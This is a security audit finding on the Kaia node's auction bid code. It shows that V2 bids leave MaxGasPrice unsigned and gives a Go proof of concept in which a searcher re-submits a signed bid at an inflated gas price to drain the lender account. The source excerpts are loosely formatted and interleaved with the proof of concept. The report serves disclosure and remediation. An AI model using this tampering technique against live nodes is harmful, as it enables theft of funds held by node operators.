### Title
Insufficient Auctioneer Signature Hashing: `MaxGasPrice` Excluded from Signed Digest for V2 Bids — (`File: kaiax/auction/bid.go`)

---

### Summary

`GetEthSignedMessageHash()` computes the auctioneer's digest by hashing only the raw `SearcherSig` bytes. For V2 bids, the V2 EIP-712 typehash omits `MaxGasPrice`, so `MaxGasPrice` is covered by neither the searcher's signature nor the auctioneer's signature. A malicious searcher can obtain a legitimate `(SearcherSig, AuctioneerSig)` pair for a bid with `MaxGasPrice = 0`, then re-submit the same bid with `MaxGasPrice` set to an arbitrarily large value. Both signature checks pass, and the CN lender executes the bid transaction at the inflated gas price, draining KAIA from the lender's account.

---

### Finding Description

**`GetEthSignedMessageHash` — `kaiax/auction/bid.go` lines 52–55**

```go
func (b *Bid) GetEthSignedMessageHash() []byte {
    data := b.SearcherSig
    return crypto.Keccak256(fmt.Appendf(nil, "\x19Ethereum Signed Message:\n%d%s", len(data), data))
}
```

The auctioneer's digest is `keccak256("\x19Ethereum Signed Message:\n65" || SearcherSig)`. It covers only the 65-byte searcher signature, with no domain separator (`chainId`, contract address) and no direct inclusion of any bid field. [1](#0-0) 

**V2 EIP-712 typehash — `kaiax/auction/eip712.go` lines 27–28**

```go
auctionType   = "AuctionTx(bytes32 targetTxHash,uint256 blockNumber,address sender,address to,uint256 nonce,uint256 bid,uint256 callGasLimit,bytes data)"
auctionTypeV3 = "AuctionTx(...,uint256 maxGasPrice,...)"
```

`maxGasPrice` is absent from the V2 typehash. `EncodeData()` for V2 never appends `b.MaxGasPrice`. [2](#0-1) [3](#0-2) 

**`ValidateSearcherSig` — `kaiax/auction/bid.go` lines 94–115**

For a V2 bid, `GetHashTypedData` selects the V2 typehash, so `SearcherSig` is valid for any value of `MaxGasPrice`. [4](#0-3) 

**`ValidateAuctioneerSig` — `kaiax/auction/bid.go` lines 117–130**

The auctioneer digest is recomputed from `b.SearcherSig` only. Because `MaxGasPrice` does not affect `SearcherSig` (V2), `AuctioneerSig` is equally valid for any `MaxGasPrice`. [5](#0-4) 

**`validateBidSigs` — `kaiax/auction/impl/bid_pool.go` lines 393–415**

Both checks pass for the tampered bid; no other guard inspects `MaxGasPrice` against a signed value. [6](#0-5) 

**Deduplication does not block the tampered bid.** `bid.Hash()` is `rlpHash(BidData)`, so a bid with a different `MaxGasPrice` has a different hash and is not rejected as a duplicate. The winner-equality check uses only `BlockNumber` and `TargetTxHash`, so the tampered bid is treated as "equal" to the original and is not blocked by `senderHasDifferentWinner`. [7](#0-6) [8](#0-7) [9](#0-8) 

---

### Impact Explanation

The CN node key (lender) holds KAIA and pays gas for bid transactions. `MaxGasPrice` caps the gas price of the bid transaction generated by `GetBidTxGenerator`. By inflating `MaxGasPrice` to an arbitrarily large value, the lender executes the bid transaction at a gas price far exceeding the `Bid` amount paid by the searcher, resulting in a net KAIA loss for the lender. This is an unauthorized fee charge affecting KAIA held by a system-managed account (the CN lender). [10](#0-9) [11](#0-10) 

---

### Likelihood Explanation

Any searcher interacting with the auction system can exploit this. The searcher submits a V2 bid with `MaxGasPrice = 0` to the auctioneer, receives a valid `AuctioneerSig`, then re-submits the same bid with `MaxGasPrice` set to a large value directly to the CN via `auction_submitBid` or P2P. Both signature validations pass. The attack requires no special privilege beyond being a searcher. [12](#0-11) 

---

### Recommendation

1. **Include all bid fields in the auctioneer's digest.** Replace `GetEthSignedMessageHash` with an EIP-712 digest over the full `BidData` struct (including `MaxGasPrice`), with a domain separator containing `chainId` and `verifyingContract`:

```go
func (b *Bid) GetAuctioneerDigest(chainId *big.Int, verifyingContract common.Address) []byte {
    return b.GetHashTypedData(chainId, verifyingContract, currentVersion)
}
```

2. **Add domain separation to `AuctioneerSig`.** Include `chainId` and `address(auctionEntryPoint)` to prevent cross-chain and cross-contract replay.

3. **Deprecate V2 bids or add `MaxGasPrice` to the V2 typehash.** As long as V2 bids are accepted, `MaxGasPrice` remains unsigned.

---

### Proof of Concept

```go
// 1. Searcher creates a V2 bid with MaxGasPrice = 0
bid := &auction.Bid{BidData: auction.BidData{
    TargetTxHash: targetHash,
    BlockNumber:  targetBlock,
    Sender:       searcherAddr,
    To:           contractAddr,
    Nonce:        0,
    Bid:          big.NewInt(1e18),
    MaxGasPrice:  big.NewInt(0),   // zero — not in V2 typehash
    CallGasLimit: 100000,
    Data:         calldata,
}}

// 2. Searcher signs with V2 typehash (MaxGasPrice absent)
digest := bid.GetHashTypedData(chainId, entryPoint, auction.AuctionVersionV2)
sig, _ := crypto.Sign(digest, searcherKey)
sig[64] += 27
bid.SearcherSig = sig

// 3. Auctioneer signs only SearcherSig bytes
auctioneerDigest := bid.GetEthSignedMessageHash() // = keccak256("\x19Ethereum Signed Message:\n65" || SearcherSig)
aSig, _ := crypto.Sign(auctioneerDigest, auctioneerKey)
aSig[64] += 27
bid.AuctioneerSig = aSig

// 4. Attacker inflates MaxGasPrice — neither signature covers it
bid.MaxGasPrice = new(big.Int).Mul(big.NewInt(1e18), big.NewInt(1000)) // 1000 KAIA per gas

// 5. Submit tampered bid directly to CN — both ValidateSearcherSig and ValidateAuctioneerSig pass
// CN lender executes bid tx at 1000 KAIA/gas, draining lender balance

func (b *Bid) ValidateSearcherSig(chainId *big.Int, verifyingContract common.Address, version string) error {
	if chainId == nil {
		return ErrNilChainId
	}

	if common.EmptyAddress(verifyingContract) {
		return ErrNilVerifyingContract
	}

	digest := b.GetHashTypedData(chainId, verifyingContract, version)

	recoveredSender, err := getSigner(b.SearcherSig, digest)
	if err != nil {
		return fmt.Errorf("failed to recover searcher sig: %v", err)
	}

	if recoveredSender != b.Sender {
		return fmt.Errorf("invalid searcher sig: expected %v, calculated %v", b.Sender.String(), recoveredSender.String())
	}

	return nil
}

func (b *Bid) EncodeData() []byte {
	encoded := make([]byte, 0)
	encoded = append(encoded, b.TargetTxHash.Bytes()...)
	encoded = append(encoded, common.LeftPadBytes(common.Int64ToByteBigEndian(b.BlockNumber), 32)...)
	encoded = append(encoded, common.LeftPadBytes(b.Sender.Bytes(), 32)...)
	encoded = append(encoded, common.LeftPadBytes(b.To.Bytes(), 32)...)
	encoded = append(encoded, common.LeftPadBytes(common.Int64ToByteBigEndian(b.Nonce), 32)...)
	encoded = append(encoded, common.LeftPadBytes(b.Bid.Bytes(), 32)...)
	encoded = append(encoded, common.LeftPadBytes(common.Int64ToByteBigEndian(b.CallGasLimit), 32)...)
	encoded = append(encoded, crypto.Keccak256Hash(b.Data).Bytes()...)
	return encoded
}

func (bp *BidPool) validateBid(bid *auction.Bid) error {
	blockNumber := bid.BlockNumber

	bp.bidMu.RLock()

	// Check if the auction tx is already in the pool.
	if _, ok := bp.bidMap[bid.Hash()]; ok {
		bp.bidMu.RUnlock()
		return auction.ErrBidAlreadyExists
	}

	// 1. The `bid.Sender` must not be in the winner list of the same block number if the new bid isn't equal to the previous bid.
	if bp.senderHasDifferentWinner(bid) {
		bp.bidMu.RUnlock()
		return auction.ErrBidSenderExists
	}
	bp.bidMu.RUnlock()

	curBlock := bp.Chain.CurrentBlock()
	if curBlock == nil {
		return auction.ErrBlockNotFound
	}

	// 2. The `bid.BlockNumber` must be in range of `[currentBlockNumber + 1, currentBlockNumber + allowFutureBlock]`.
	curNum := curBlock.NumberU64()
	if blockNumber <= curNum || blockNumber > curNum+allowFutureBlock {
		return auction.ErrInvalidBlockNumber
	}

	// 3. The `bid.Bid` must be greater than 0.
	if bid.Bid.Sign() <= 0 {
		return auction.ErrZeroBid
	}

	// 4. The data size must be less than the maximum limit.
	if uint64(len(bid.Data)) > BidTxMaxDataSize {
		return auction.ErrExceedMaxDataSize
	}

	// 5. The gas limit must be less than the maximum limit.
	if bid.CallGasLimit > BidTxMaxCallGasLimit {
		return auction.ErrExceedMaxCallGasLimit
	}

	// 6. The `bid.SearcherSig` and `bid.AuctioneerSig` must be valid.
	if err := bp.validateBidSigs(bid); err != nil {
		return err
	}

	return nil
}

```go
func (bp *BidPool) validateBidSigs(bid *auction.Bid) error {
	bp.auctionInfoMu.RLock()
	defer bp.auctionInfoMu.RUnlock()

	if bid.SearcherSig == nil || len(bid.SearcherSig) != crypto.SignatureLength {
		return auction.ErrInvalidSearcherSig
	}
	if bid.AuctioneerSig == nil || len(bid.AuctioneerSig) != crypto.SignatureLength {
		return auction.ErrInvalidAuctioneerSig
	}

	// Verify the EIP712 signature.
	if err := bid.ValidateSearcherSig(bp.ChainConfig.ChainID, bp.auctionEntryPoint, bp.auctionEntryPointVersion); err != nil {
		return err
	}

	// Verify the auctioneer signature.
	if err := bid.ValidateAuctioneerSig(bp.auctioneer); err != nil {
		return err
	}

	return nil
}
